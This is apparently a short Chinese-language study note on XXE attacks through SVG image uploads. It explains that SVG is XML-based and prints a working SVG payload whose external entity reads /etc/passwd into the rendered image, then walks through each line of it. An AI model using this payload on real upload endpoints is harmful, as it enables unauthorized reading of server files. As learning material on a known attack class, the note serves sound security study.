---
tags:
  - XXE
  - XML
  - WEB
Date: 2026-01-06
---
## SVG文件
基于XML标记语言，用于描述二维的矢量图形。
是一种<mark style="background: #FFB8EBA6;">图片格式</mark>

SVG图像及其相关行为被定义于XML文本文件之中，意味着可以使用任何文本编辑器和绘图软件进行编辑

因此，可以通过SVG文件经行XXE漏洞利用
通过上传SVG文件来进行读取

如下是一个svg文件示例，也是由xml格式编辑
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">

  <text x="10" y="20" font-family="Arial" font-size="14">

    &xxe;

  </text>
```

xml的声明：standalone标识无外部DTD引用
DOCTYPE内部定义DTD命名实体xxe
然后是svg的声明，类似xinclude的声明
text标签定义了文字字体大小和x和y轴的位置
最后调用执行xxe实体